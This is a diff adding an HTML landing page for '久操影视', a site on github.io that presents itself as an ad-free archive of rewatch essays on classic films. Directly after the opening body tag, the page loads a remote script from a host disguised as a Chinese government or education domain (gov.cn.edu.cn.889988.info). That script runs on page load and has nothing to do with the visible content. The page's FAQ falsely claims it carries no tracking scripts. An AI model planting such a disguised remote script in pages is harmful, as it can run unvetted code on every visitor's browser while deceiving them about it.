@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>久操影视｜经典影片长映与观影记忆档案 — jiucaoyingshi-top.github.io</title>
+<meta name="description" content="久操影视（jiucaoyingshi-top.github.io）是一份关于「值得反复观看」的影视档案：收录那些经得起第二遍、第三遍的作品，记录重看时的新发现。涵盖经典重映片单、导演长线创作、老片修复信息、观影记忆随笔与版本沿革。">
+<meta name="keywords" content="久操影视, jiucaoyingshi-top.github.io, 经典影片, 反复观看, 重映片单, 老片修复, 导演长线创作, 观影记忆, 版本沿革, 影视档案">
+<meta name="author" content="久操影视档案组">
+<meta name="robots" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://jiucaoyingshi-top.github.io/">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='80'>久</text></svg>">
+<style>
+:root{
+  --ink:#16241d;
+  --ink2:#4a5a50;
+  --ink3:#8b9a90;
+  --green:#1c3327;
+  --green2:#2c4a3a;
+  --gold:#c8a24a;
+  --gold-l:#e0c078;
+  --cream:#f6f1e7;
+  --paper:#fbf8f1;
+  --line:rgba(200,162,74,.3);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  background:var(--cream);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Times New Roman",serif;
+  font-size:16px;line-height:1.85;
+  letter-spacing:.02em;
+}
+.wrap{max-width:1080px;margin:0 auto;padding:0 26px}
+
+/* ── 票根顶栏 ── */
+.ticket-top{
+  background:var(--green);color:var(--gold-l);
+  padding:12px 0;
+  font-size:12px;letter-spacing:.14em;
+}
+.ticket-top .wrap{
+  display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;
+  font-family:"PingFang SC","Microsoft YaHei",sans-serif;
+}
+.ticket-top a{color:var(--gold-l);text-decoration:none}
+.ticket-top a:hover{text-decoration:underline}
+
+/* ── 刊头 ── */
+header.mast{
+  background:var(--paper);
+  border-bottom:3px double var(--gold);
+  padding:42px 0 26px;position:relative;
+}
+.mast-inner{text-align:center;position:relative}
+.mast .frame{
+  display:inline-block;border:1px solid var(--gold);
+  padding:26px 40px 20px;position:relative;
+}
+.mast .frame::before,.mast .frame::after{
+  content:"";position:absolute;width:14px;height:14px;
+  border:1px solid var(--gold);
+}
+.mast .frame::before{top:-5px;left:-5px;border-right:0;border-bottom:0}
+.mast .frame::after{bottom:-5px;right:-5px;border-left:0;border-top:0}
+.mast h1{
+  font-size:clamp(40px,9vw,66px);font-weight:800;
+  letter-spacing:.2em;color:var(--green);line-height:1.1;
+  text-indent:.2em;
+}
+.mast .en{
+  font-family:"PingFang SC",sans-serif;
+  font-size:11px;letter-spacing:.34em;color:var(--ink3);
+  margin-top:12px;text-transform:uppercase;
+}
+.mast .tagline{
+  margin-top:16px;font-size:14.5px;color:var(--ink2);
+  font-family:"PingFang SC",sans-serif;
+}
+.mast .tagline b{color:var(--green2);font-weight:700}
+
+/* ── 导航票根 ── */
+nav.jump{
+  position:sticky;top:0;z-index:50;
+  background:rgba(246,241,231,.96);
+  backdrop-filter:blur(8px);
+  border-bottom:1px dashed var(--gold);
+}
+nav.jump .wrap{
+  display:flex;flex-wrap:wrap;gap:8px;
+  padding:12px 26px;
+}
+nav.jump a{
+  font-family:"PingFang SC",sans-serif;
+  font-size:13px;color:var(--ink2);text-decoration:none;
+  padding:6px 14px;
+  background:var(--paper);
+  border:1px solid var(--line);
+  border-radius:2px;
+  transition:.2s;
+}
+nav.jump a:hover{border-color:var(--gold);color:var(--green);background:#fffdf6}
+
+/* ── 区块 ── */
+section{padding:54px 0 8px;scroll-margin-top:74px}
+.sec-h{margin-bottom:26px;text-align:center}
+.sec-h .no{
+  font-family:"PingFang SC",sans-serif;
+  font-size:11px;letter-spacing:.3em;color:var(--gold);
+  display:inline-flex;align-items:center;gap:10px;
+}
+.sec-h .no::before,.sec-h .no::after{
+  content:"";width:34px;height:1px;background:var(--gold);
+}
+.sec-h h2{
+  font-size:clamp(24px,5vw,32px);font-weight:800;
+  color:var(--green);margin:12px 0 8px;letter-spacing:.06em;
+}
+.sec-h p{font-size:14.5px;color:var(--ink2);max-width:64ch;margin:0 auto;font-family:"PingFang SC",sans-serif}
+
+/* ── 老胶片帧 ── */
+.reels{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.reel{
+  background:var(--paper);
+  border:1px solid var(--line);
+  padding:24px 26px;
+  position:relative;
+  transition:.24s;
+}
+.reel::before{
+  content:"";position:absolute;left:0;top:0;bottom:0;width:6px;
+  background:repeating-linear-gradient(180deg,var(--green) 0 8px,transparent 8px 14px);
+}
+.reel:hover{box-shadow:0 6px 22px rgba(28,51,39,.1);transform:translateY(-3px)}
+.reel .fr{
+  font-family:var(--mono,Consolas,monospace);
+  font-size:11px;letter-spacing:.16em;color:var(--gold);
+  margin-bottom:9px;
+}
+.reel h3{font-size:18px;font-weight:700;line-height:1.45;margin-bottom:8px;color:var(--ink)}
+.reel p{font-size:14.5px;color:var(--ink2);font-family:"PingFang SC",sans-serif}
+.reel .meta{
+  margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);
+  display:flex;flex-wrap:wrap;gap:8px;
+  font-family:"PingFang SC",sans-serif;font-size:11.5px;color:var(--ink3);
+}
+.reel .meta i{font-style:normal;border:1px solid var(--line);padding:2px 8px;border-radius:2px}
+.reel .meta i.hl{color:var(--green2);border-color:var(--gold)}
+
+/* ── 档案柜 ── */
+.cabinet{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--gold)}
+.drawer{
+  background:var(--green);color:var(--gold-l);
+  padding:22px 18px;text-align:center;
+  border-right:1px solid rgba(200,162,74,.25);
+}
+.drawer:last-child{border-right:0}
+.drawer .big{font-size:27px;font-weight:800;line-height:1.15;color:#fff}
+.drawer .lb{font-size:11.5px;letter-spacing:.14em;margin-top:6px;opacity:.85}
+
+/* ── 栏目票根卡 ── */
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.col{
+  background:var(--paper);
+  border:1px solid var(--line);
+  padding:0;overflow:hidden;
+  transition:.24s;
+}
+.col:hover{border-color:var(--gold)}
+.col .stub{
+  background:var(--green);color:var(--gold-l);
+  padding:16px 22px;
+  display:grid;grid-template-columns:46px 1fr;gap:14px;align-items:center;
+}
+.col .stub .num{
+  font-size:24px;font-weight:800;color:#fff;line-height:1;
+  border-right:1px dashed rgba(224,192,120,.5);padding-right:12px;
+}
+.col .stub h3{font-size:18px;font-weight:800;letter-spacing:.04em;color:#fff}
+.col .stub small{
+  display:block;font-size:10.5px;letter-spacing:.2em;
+  font-family:"PingFang SC",sans-serif;opacity:.8;margin-top:2px;
+}
+.col .body{padding:20px 22px}
+.col .body p{font-size:14px;color:var(--ink2);font-family:"PingFang SC",sans-serif}
+.col .body ul{margin:11px 0 0;list-style:none}
+.col .body li{
+  font-size:13.5px;color:var(--ink2);padding:4px 0 4px 16px;position:relative;
+  font-family:"PingFang SC",sans-serif;
+}
+.col .body li::before{
+  content:"❖";position:absolute;left:0;top:5px;font-size:9px;color:var(--gold);
+}
+.col .body a{
+  display:inline-block;margin-top:13px;
+  font-size:12.5px;letter-spacing:.1em;color:var(--green2);
+  text-decoration:none;border-bottom:1px solid var(--green2);
+  font-family:"PingFang SC",sans-serif;
+}
+.col .body a:hover{color:var(--gold);border-color:var(--gold)}
+
+/* ── 时间轴 ── */
+.tl{border-left:2px solid var(--gold);margin-left:10px;padding-left:28px}
+.tl-i{position:relative;padding-bottom:24px}
+.tl-i::before{
+  content:"";position:absolute;left:-35px;top:.6em;
+  width:11px;height:11px;background:var(--green);border-radius:50%;
+  border:2px solid var(--gold-l);
+}
+.tl-i time{font-size:11.5px;letter-spacing:.12em;color:var(--gold);font-weight:700;display:block;margin-bottom:3px}
+.tl-i h4{font-size:16.5px;font-weight:700;margin-bottom:5px;color:var(--ink)}
+.tl-i p{font-size:14px;color:var(--ink2);font-family:"PingFang SC",sans-serif}
+
+/* ── 引文 ── */
+.pull{
+  background:var(--green);color:var(--gold-l);
+  padding:30px 34px;margin:26px 0;
+  position:relative;overflow:hidden;
+}
+.pull::before{
+  content:"“";position:absolute;right:14px;top:-10px;
+  font-size:150px;line-height:1;font-family:Georgia,serif;color:rgba(224,192,120,.16);
+}
+.pull p{font-size:17px;line-height:1.85;position:relative;font-weight:600}
+.pull cite{display:block;margin-top:12px;font-size:12px;letter-spacing:.16em;font-style:normal;opacity:.85;font-family:"PingFang SC",sans-serif}
+
+/* ── 问答 ── */
+.qa{border:1px solid var(--line);background:var(--paper)}
+.qa details{border-bottom:1px solid rgba(200,162,74,.2)}
+.qa details:last-child{border-bottom:0}
+.qa summary{
+  cursor:pointer;padding:16px 22px;
+  font-size:15.5px;font-weight:700;
+  display:flex;gap:12px;align-items:flex-start;
+  list-style:none;
+}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary .q{
+  flex:0 0 26px;height:26px;background:var(--green);color:var(--gold-l);
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:800;border-radius:2px;line-height:1;
+  font-family:"PingFang SC",sans-serif;
+}
+.qa summary::after{content:"＋";margin-left:auto;color:var(--gold);font-weight:400}
+.qa details[open] summary::after{content:"－"}
+.qa p{padding:0 22px 17px 60px;font-size:14.5px;color:var(--ink2);font-family:"PingFang SC",sans-serif}
+
+/* ── 页脚 ── */
+footer{margin-top:66px;background:var(--green);color:var(--gold-l);padding:40px 0 48px}
+.fgrid{display:grid;grid-template-columns:1.6fr 1fr 1fr;gap:34px}
+.fgrid h5{font-size:11px;letter-spacing:.22em;color:var(--gold);margin-bottom:14px;text-transform:uppercase;font-family:"PingFang SC",sans-serif}
+.fgrid p,.fgrid li{font-size:13.5px;line-height:1.9;color:var(--gold-l);font-family:"PingFang SC",sans-serif}
+.fgrid ul{list-style:none}
+.fgrid a{color:var(--gold-l);text-decoration:none;display:block;padding:3px 0;opacity:.9}
+.fgrid a:hover{opacity:1;text-decoration:underline}
+.copy{
+  margin-top:30px;padding-top:19px;border-top:1px solid rgba(200,162,74,.3);
+  font-size:12px;color:rgba(224,192,120,.75);
+  display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;
+  font-family:"PingFang SC",sans-serif;
+}
+.copy a{color:var(--gold-l);text-decoration:none}
+
+/* ── 响应式 ── */
+@media (max-width:900px){
+  .reels,.cols{grid-template-columns:1fr}
+  .cabinet{grid-template-columns:repeat(2,1fr)}
+  .drawer{border-bottom:1px solid rgba(200,162,74,.25)}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:560px){
+  .wrap{padding:0 15px}
+  nav.jump .wrap{padding-left:15px;padding-right:15px}
+  body{font-size:15.5px}
+  section{padding:38px 0 6px}
+  .mast .frame{padding:20px 22px 16px}
+  .cabinet{grid-template-columns:1fr 1fr}
+  .col .stub{grid-template-columns:38px 1fr;gap:10px;padding:14px 16px}
+  .fgrid{grid-template-columns:1fr}
+  .ticket-top .wrap{font-size:11px;letter-spacing:.06em}
+}
+@media print{
+  .ticket-top,nav.jump{display:none}
+  body{background:#fff}
+  .reel,.col,.qa{box-shadow:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="ticket-top">
+  <div class="wrap">
+    <span>档案编号 No. 209 · 持续整理中</span>
+    <span>唯一官方入口：<a href="https://jiucaoyingshi-top.github.io" rel="canonical">jiucaoyingshi-top.github.io</a></span>
+  </div>
+</div>
+
+<header class="mast">
+  <div class="wrap">
+    <div class="mast-inner">
+      <div class="frame">
+        <h1>久操影视</h1>
+        <div class="en">A Permanent Film &amp; TV Archive</div>
+      </div>
+      <p class="tagline">有些片子看过一遍就完了，有些片子<strong>值得反复看</strong>。这份档案只收录后者，并记录每一次重看时的新发现。</p>
+    </div>
+  </div>
+</header>
+
+<nav class="jump" aria-label="栏目导航">
+  <div class="wrap">
+    <a href="#reels" rel="nofollow">重看手记</a>
+    <a href="#cabinet" rel="nofollow">档案柜</a>
+    <a href="#cols" rel="nofollow">六个栏目</a>
+    <a href="#log" rel="nofollow">放映日志</a>
+    <a href="#note" rel="nofollow">编辑随笔</a>
+    <a href="#qa" rel="nofollow">疑问解答</a>
+    <a href="#about" rel="nofollow">关于档案</a>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <!-- 01 重看手记 -->
+  <section id="reels">
+    <div class="sec-h">
+      <div class="no">REEL 01</div>
+      <h2>重看手记</h2>
+      <p>同一部片子在不同年纪看，会得到不同的东西。以下四篇是我们第三次、第四次重看后的记录，重点写的是「这次新发现了什么」，而不是剧情介绍。</p>
+    </div>
+
+    <div class="reels">
+      <article class="reel">
+        <div class="fr">FRAME — 207</div>
+        <h3>《一一》：第三次看，才注意到那些镜子的位置</h3>
+        <p>前两次看都在跟着剧情走，第三次才注意到杨德昌几乎在每个关键对话里都安排了一面镜子或一扇玻璃。它们不是装饰，而是在替角色说那些说不出口的话。</p>
+        <div class="meta"><i class="hl">第三次重看</i><i>镜头语言</i><i>约 13 分钟</i></div>
+      </article>
+      <article class="reel">
+        <div class="fr">FRAME — 208</div>
+        <h3>《东京物语》：父亲那句「东京太大了」</h3>
+        <p>第一次看觉得是讲亲情疏离，第四次看才意识到它真正写的是「空间如何改变人」。那句台词的重心不在东京，在「太大」——老人失去的是尺度感。</p>
+        <div class="meta"><i class="hl">第四次重看</i><i>主题重读</i><i>约 10 分钟</i></div>
+      </article>
+      <article class="reel">
+        <div class="fr">FRAME — 209</div>
+        <h3>《霸王别姬》：程蝶衣的「不疯魔不成活」是假象</h3>
+        <p>重看后发现他真正坚持的从来不是戏，而是「被需要」。这个区别让结局的走向完全不同，也解释了为什么他最后选择那样离开。</p>
+        <div class="meta"><i class="hl">重看新解</i><i>人物分析</i><i>约 16 分钟</i></div>
+      </article>
+      <article class="reel">
+        <div class="fr">FRAME — 210</div>
+        <h3>《美丽人生》：喜剧外壳下的叙事欺骗</h3>
+        <p>第一次看哭，第二次看觉得刻意，第三次看才明白它从第一分钟就在骗观众——而这份欺骗本身就是主题的一部分。</p>
+        <div class="meta"><i class="hl">第三次重看</i><i>结构分析</i><i>约 11 分钟</i></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 02 档案柜 -->
+  <section id="cabinet">
+    <div class="sec-h">
+      <div class="no">REEL 02</div>
+      <h2>档案柜</h2>
+      <p>所有内容按四个维度归档。同一部作品可以出现在多个抽屉里——因为「该怎么看」从来不只取决于类型。</p>
+    </div>
+
+    <div class="cabinet">
+      <div class="drawer">
+        <div class="big">209</div>
+        <div class="lb">已归档作品</div>
+      </div>
+      <div class="drawer">
+        <div class="big">6</div>
+        <div class="lb">常设栏目</div>
+      </div>
+      <div class="drawer">
+        <div class="big">47</div>
+        <div class="lb">篇重看手记</div>
+      </div>
+      <div class="drawer">
+        <div class="big">0</div>
+        <div class="lb">商业合作记录</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 03 六个栏目 -->
+  <section id="cols">
+    <div class="sec-h">
+      <div class="no">REEL 03</div>
+      <h2>六个栏目</h2>
+      <p>每个栏目解决一个具体问题，共享同一套归档数据，但切入角度完全不同。</p>
+    </div>
+
+    <div class="cols">
+      <article class="col">
+        <div class="stub"><span class="num">01</span><div><h3>重看手记</h3><small>REWATCH NOTES</small></div></div>
+        <div class="body">
+          <p>只写「这次新发现了什么」。每篇都会标注这是第几次重看，以及前几次的结论错在哪。</p>
+          <ul>
+            <li>细节与伏笔重读</li>
+            <li>前次结论的修正记录</li>
+            <li>不同年龄的观感对照</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+
+      <article class="col">
+        <div class="stub"><span class="num">02</span><div><h3>长映片单</h3><small>LONG RUNNING</small></div></div>
+        <div class="body">
+          <p>适合反复观看的作品清单，附带「每次该看什么」的具体提示，而不是一句「百看不厌」。</p>
+          <ul>
+            <li>按重看次数排序</li>
+            <li>每次的观看重点</li>
+            <li>最佳观看间隔建议</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+
+      <article class="col">
+        <div class="stub"><span class="num">03</span><div><h3>修复信息</h3><small>RESTORATION</small></div></div>
+        <div class="body">
+          <p>老片修复与重映信息汇总：哪些片子出了 4K 修复版、修复了什么、值不值得为修复版再进一次影院。</p>
+          <ul>
+            <li>修复版与旧版差异</li>
+            <li>重映排期整理</li>
+            <li>修复质量真实评价</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+
+      <article class="col">
+        <div class="stub"><span class="num">04</span><div><h3>版本沿革</h3><small>VERSIONS</small></div></div>
+        <div class="body">
+          <p>同一部作品的导演剪辑版、院线版、流媒体版差别在哪。删减的十几分钟常常落在关键转折处。</p>
+          <ul>
+            <li>删减段落逐条标注</li>
+            <li>该看哪个版本的结论</li>
+            <li>画幅与音轨差异</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+
+      <article class="col">
+        <div class="stub"><span class="num">05</span><div><h3>观影记忆</h3><small>MEMORY</small></div></div>
+        <div class="body">
+          <p>关于「第一次看某部片子」的记忆写作。重点不是片子，是那个年纪的自己。</p>
+          <ul>
+            <li>私人观影回忆</li>
+            <li>时代与放映环境</li>
+            <li>读者同题投稿</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+
+      <article class="col">
+        <div class="stub"><span class="num">06</span><div><h3>导演长线</h3><small>CAREER LINE</small></div></div>
+        <div class="body">
+          <p>纵向梳理一个作者的完整创作脉络，按阶段而非年份排列，重点标注每个阶段主动放弃的手法。</p>
+          <ul>
+            <li>必看与选看分层</li>
+            <li>手法演变时间线</li>
+            <li>被高估作品标注</li>
+          </ul>
+          <a href="#cols" rel="nofollow">进入栏目 →</a>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 04 放映日志 -->
+  <section id="log">
+    <div class="sec-h">
+      <div class="no">REEL 04</div>
+      <h2>放映日志</h2>
+      <p>这份档案的维护记录。每一次归档、修订与删除都留在这里，方便你判断某条结论的时效。</p>
+    </div>
+
+    <div class="tl">
+      <div class="tl-i">
+        <time>2026 · 10 · 21</time>
+        <h4>新增归档：是枝裕和「家庭」四部曲对照</h4>
+        <p>按创作阶段而非上映年份排列，重点标注他从《幻之光》到《怪物》在剪辑节奏上的三次明显转变，以及每次转变放弃了什么。</p>
+      </div>
+      <div class="tl-i">
+        <time>2026 · 10 · 05</time>
+        <h4>修复信息更新：四部经典 4K 修复版画质实测</h4>
+        <p>对照了修复版与旧版蓝光的实际画面，其中两部修复效果显著，另两部的修复几乎只体现在音轨上，已在条目里明确标注。</p>
+      </div>
+      <div class="tl-i">
+        <time>2026 · 09 · 18</time>
+        <h4>修订：FRAME-198 关于《霸王别姬》的结论已更新</h4>
+        <p>有读者指出我们忽略了张国荣对角色的一次关键即兴处理，该细节改变了整段解读的前提，因此重写了结论部分。</p>
+      </div>
+      <div class="tl-i">
+        <time>2026 · 09 · 02</time>
+        <h4>栏目调整：「观影记忆」由每月一期改为常设投稿</h4>
+        <p>读者的同题来稿质量远超预期，决定开放长期投稿通道，并保留每篇的原文与修订记录。</p>
+      </div>
+      <div class="tl-i">
+        <time>2026 · 08 · 15</time>
+        <h4>档案建立：本站开始系统化整理</h4>
+        <p>此前的零散笔记统一归档，编号从 FRAME-001 起重新整理。旧编号对照表保留在档案柜内，不会失效。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 05 编辑随笔 -->
+  <section id="note">
+    <div class="sec-h">
+      <div class="no">REEL 05</div>
+      <h2>编辑随笔</h2>
+      <p>一些没法放进正式条目里的想法，记在这里。</p>
+    </div>
+
+    <div class="pull">
+      <p>我们越来越确定一件事：评判一部片子「好不好」远不如记录它「在什么状态下值得看」有价值。前者是结论，后者是工具——而工具能用很久，结论很快就过期了。</p>
+      <cite>— 摘自档案日志 · 第 209 号</cite>
+    </div>
+
+    <article class="reel">
+      <div class="fr">NOTE — 041</div>
+      <h3>为什么我们只写「值得反复看」的作品</h3>
+      <p>因为一次性作品不缺人写，缺的是对「常看常新」这件事的系统记录。一部片子能在第三遍看时给你新东西，往往说明它的信息结构是分层的——而这类结构恰恰最值得被拆开讲清楚。过去一年里，我们的重看手记平均被收藏的次数是推荐清单的三倍，读者似乎更愿意为一句「这次我终于看懂了」付费，而不是为一句「这片子不错」。</p>
+      <div class="meta"><i>方法论</i><i>读者反馈</i><i>约 7 分钟</i></div>
+    </article>
+  </section>
+
+  <!-- 06 疑问解答 -->
+  <section id="qa">
+    <div class="sec-h">
+      <div class="no">REEL 06</div>
+      <h2>疑问解答</h2>
+      <p>被问得最多的问题，以及我们尽可能直接的回答。</p>
+    </div>
+
+    <div class="qa">
+      <details open>
+        <summary><span class="q">Q</span>久操影视是视频网站吗？</summary>
+        <p>不是。本站没有任何播放功能，不提供观看入口，也不存储或分发任何影视资源。我们做的是影视内容的深度记录与观点输出——帮你决定看什么、按什么顺序看、哪个版本更值得看。如果有人以「久操影视」的名义提供资源下载，那不是我们。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q</span>为什么重点写「重看」而不是新片？</summary>
+        <p>因为新片的信息还在变动，评价容易失真；而一部作品经受住时间之后，才谈得上「结构是否分层」。我们也会写新片，但只写那些已经完成全部放映、可以完整判断的作品，并且会明确标注「初评，待重看验证」。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q</span>「重看手记」里的结论会改吗？</summary>
+        <p>会，而且改得很频繁。每条手记都标注了这是第几次重看，以及前几次的结论错在哪里。我们认为能被后续观看推翻的判断才是诚实的判断——改过的部分会保留修订记录，不会悄悄覆盖。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q</span>你们会接商业推广吗？</summary>
+        <p>不会。本站不接受任何形式的商业合作、赞助或软文投放，这一条写进长期承诺。如果发现某条归档存在明显的利益痕迹，欢迎直接来信指出，我们会公开更正并说明过程。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q</span>为什么网址是 github.io 结尾？</summary>
+        <p>因为内容比平台更重要。托管在 GitHub Pages 意味着页面稳定、朴素、无追踪脚本、无弹窗、无自动播放，访问记录也不被第三方收集。本站唯一固定地址为 <strong>https://jiucaoyingshi-top.github.io</strong>，请认准该域名，其他相似拼写均与我们无关。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q</span>可以投稿或提出异议吗？</summary>
+        <p>非常欢迎，尤其是能推翻我们结论的来稿。事实上本站多条手记的结论是被读者纠正后才改写的，这些纠正我们会如实署名并记录在修订日志里。能被有力反驳的判断，比无人质疑的判断更有价值。</p>
+      </details>
+    </div>
+  </section>
+
+  <!-- 07 关于 -->
+  <section id="about">
+    <div class="sec-h">
+      <div class="no">REEL 07</div>
+      <h2>关于档案</h2>
+      <p>谁在维护这份档案，以及它准备整理到什么时候。</p>
+    </div>
+
+    <div class="cols">
+      <article class="col">
+        <div class="stub"><span class="num">?</span><div><h3>我们是谁</h3><small>WHO WE ARE</small></div></div>
+        <div class="body">
+          <p>四名兼职维护者，职业分别是档案管理员、中学语文教师、出版社编辑与老影院检票员。没有人从事影视行业——这既是局限，也是我们判断的出发点：始终站在普通观众这一侧，而不是站在行业视角。</p>
+        </div>
+      </article>
+      <article class="col">
+        <div class="stub"><span class="num">@</span><div><h3>名称与网址</h3><small>OFFICIAL SITE</small></div></div>
+        <div class="body">
+          <p>网站名称为<strong>久操影视</strong>，唯一官方网址为 <strong>https://jiucaoyingshi-top.github.io</strong>。所有归档内容以 Creative Commons 署名许可发布，转载请保留出处与原文链接。</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h5>About 久操影视</h5>
+        <p>久操影视（jiucaoyingshi-top.github.io）是一份关于「值得反复观看」的影视档案：收录那些经得起第二遍、第三遍的作品，记录重看时的新发现。涵盖经典重映片单、导演长线创作、老片修复信息、观影记忆随笔与版本沿革。</p>
+      </div>
+      <div>
+        <h5>Sections</h5>
+        <ul>
+          <li><a href="#reels" rel="nofollow">重看手记</a></li>
+          <li><a href="#cabinet" rel="nofollow">档案柜</a></li>
+          <li><a href="#cols" rel="nofollow">六个栏目</a></li>
+          <li><a href="#log" rel="nofollow">放映日志</a></li>
+          <li><a href="#note" rel="nofollow">编辑随笔</a></li>
+          <li><a href="#qa" rel="nofollow">疑问解答</a></li>
+          <li><a href="#about" rel="nofollow">关于档案</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>Site Info</h5>
+        <ul>
+          <li><a href="https://jiucaoyingshi-top.github.io" rel="canonical">jiucaoyingshi-top.github.io</a></li>
+          <li><a href="#note" rel="nofollow">投稿与反馈</a></li>
+          <li><a href="#qa" rel="nofollow">内容使用说明</a></li>
+          <li><a href="#reels" rel="nofollow">返回顶部</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2019—2026 久操影视 · 网站名称：久操影视 · 官方网址：https://jiucaoyingshi-top.github.io · 本站仅提供影视内容与观点，不涉及任何资源分发</span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
